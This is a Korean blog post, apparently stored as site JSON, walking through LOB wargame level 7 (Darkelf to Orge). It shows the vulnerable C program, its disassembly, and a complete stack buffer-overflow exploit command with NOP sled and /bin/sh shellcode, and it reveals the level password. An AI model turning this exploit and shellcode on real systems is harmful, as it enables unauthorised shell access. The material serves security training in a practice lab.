{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221017/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에</h3>\n<p>이번 문제도 얼마든지 NOP SLED로 풀이가 가능했다.</p>\n<h3>1. Level 7 : Darkelf -> Orge</h3>\n<p>이번 문제는 코드가 조금 특이하다. 확인해보자</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\r\nextern char **environ;\r\n\r\nmain(int argc, char *argv[])\r\n{\r\n        char buffer[40];\r\n        int i;\r\n\r\n        if(argc &lt; 2){\r\n                printf(\"argv error\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        // here is changed!\r\n        if(strlen(argv[0]) != 77){\r\n                printf(\"argv[0] error\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        // egghunter\r\n        for(i=0; environ[i]; i++)\r\n                memset(environ[i], 0, strlen(environ[i]));\r\n\r\n        if(argv[1][47] != '\\xbf')\r\n        {\r\n                printf(\"stack is still your friend.\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        // check the length of argument\r\n        if(strlen(argv[1]) > 48){\r\n                printf(\"argument is too long!\\n\");\r\n                exit(0);\r\n        }\r\n\r\n        strcpy(buffer, argv[1]);\r\n        printf(\"%s\\n\", buffer);\r\n\r\n        // buffer hunter\r\n        memset(buffer, 0, 40);\r\n}</code></pre></div>\n<p>다른 코드는 저번과 똑같은데, strlen(argv[0]) != 77라는 조건문이 생겼다. argv[0]? 매개변수는 argv[1]부터 시작인데?</p>\n<p><strong>그렇다, 파일 이름이 0번째 매개변수이다. 따라서 우리는 파일 이름을 75글자로 바꿔줘야 한다(./가 붙으니 2바이트는 채워진다.)</strong></p>\n<p>파일 이름을 바꾸는 법은 간단하니 넘어가고, 나머지 풀이과정은 전 문제와 동일하다. 어셈블리 코드 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x8048500 &lt;main>:       push   %ebp\r\n0x8048501 &lt;main+1>:     mov    %ebp,%esp\r\n0x8048503 &lt;main+3>:     sub    %esp,44\r\n0x8048506 &lt;main+6>:     cmp    DWORD PTR [%ebp+8],1\r\n0x804850a &lt;main+10>:    jg     0x8048523 &lt;main+35>\r\n0x804850c &lt;main+12>:    push   0x8048690\r\n0x8048511 &lt;main+17>:    call   0x8048410 &lt;printf>\r\n0x8048516 &lt;main+22>:    add    %esp,4\r\n0x8048519 &lt;main+25>:    push   0\r\n0x804851b &lt;main+27>:    call   0x8048420 &lt;exit>\r\n0x8048520 &lt;main+32>:    add    %esp,4\r\n0x8048523 &lt;main+35>:    mov    %eax,DWORD PTR [%ebp+12]\r\n0x8048526 &lt;main+38>:    mov    %edx,DWORD PTR [%eax]\r\n0x8048528 &lt;main+40>:    push   %edx\r\n0x8048529 &lt;main+41>:    call   0x80483f0 &lt;strlen>\r\n0x804852e &lt;main+46>:    add    %esp,4\r\n0x8048531 &lt;main+49>:    mov    %eax,%eax\r\n0x8048533 &lt;main+51>:    cmp    %eax,77\r\n0x8048536 &lt;main+54>:    je     0x8048550 &lt;main+80>\r\n0x8048538 &lt;main+56>:    push   0x804869c\r\n0x804853d &lt;main+61>:    call   0x8048410 &lt;printf>\r\n0x8048542 &lt;main+66>:    add    %esp,4\r\n0x8048545 &lt;main+69>:    push   0\r\n0x8048547 &lt;main+71>:    call   0x8048420 &lt;exit>\r\n0x804854c &lt;main+76>:    add    %esp,4\r\n0x804854f &lt;main+79>:    nop\r\n0x8048550 &lt;main+80>:    nop\r\n0x8048551 &lt;main+81>:    mov    DWORD PTR [%ebp-44],0x0\r\n0x8048558 &lt;main+88>:    mov    %eax,DWORD PTR [%ebp-44]\r\n0x804855b &lt;main+91>:    lea    %edx,[%eax*4]\r\n...생략</code></pre></div>\n<p>ebp-44이니 더미 44개 + 리턴주소 4바이트로 대략적인 두 번째 매개변수의 주소를 리턴으로 넘겨줘 NOP SLED로 쉘코드를 실행시킨다.</p>\n<p>익스플로잇 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">./`python -c 'print \"A\"*75'` `python -c 'print \"A\"*44+\"\\x98\\xfb\\xff\\xbf\"'` `python -c 'print \"\\x90\"*100 + \"\\x90\"*100+\"\\x90\"*150+\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\"'`</code></pre></div>\n<p>비밀번호 : timewalker</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"FTZ LOB LEVEL 7","summary":"","date":"2022.10.17.","before":"2022.10.16.","after":"2022.10.18.","categories":["C-SEC","KOR","PWN"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVVkeVbX188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwERBBMSACExkdL/2gAIAQMBAT8B2ilGRqfkmnJaO5BG2Fm7EEBS+Rl5DcJ1Lio5UF8u9RLSvwPufnr/xAAeEQACAgICAwAAAAAAAAAAAAACAwEEEiEAEyIx0f/aAAgBAgEBPwGsMuOvJoqKdUSa02ASruFNphvYnsFMEQTYJzZgvHNpzjM7LvZGsla16P5z/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIDBBIABRETISIxQRQVIzKSoeH/2gAIAQEABj8Cr8omzfNjSx0cVDkTQ1ctNLk8805aGopgwe2jCPUeqprZBLtoiABi49xzLNBmMiyVFOlaqho6iOCd13t5eH3VtdLF05PQCcctz56Tx+sEaq61NHJQkSC/bjHzI8Wv1lR06X72ySL2Y42nGqqblFzWp5NijQKWJBJHkdscKfy/mP/EAB0QAQADAAIDAQAAAAAAAAAAAAEAESFBUTFhcYH/2gAIAQEAAT8hzE24tLQPVhJNJSUr0wCVxU0kcX1weVyNLTnpyNwLOBO6TwpZRaBNbsWfuEhKrYwKf3z+J//aAAwDAQACAAMAAAAQkN//xAAaEQEAAgMBAAAAAAAAAAAAAAABETEAIaFh/9oACAEDAQE/EEyD5/zMnaTFJWUhNy32jxPPc//EABoRAQACAwEAAAAAAAAAAAAAAAERMQAhQZH/2gAIAQIBAT8QEX6POL11GhsyL86M8GpYB4FVWf/EABgQAQEBAQEAAAAAAAAAAAAAAAERIQAx/9oACAEBAAE/EJoUOgd33xFiGjvwLQjW8KY0zoweyIVAKQD6LTn7qVBNlE8EIiuUSHK55IjERS7B4w67dNSnsqKzV7//2Q=="},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221017/"}},"staticQueryHashes":[],"slicesMap":{}}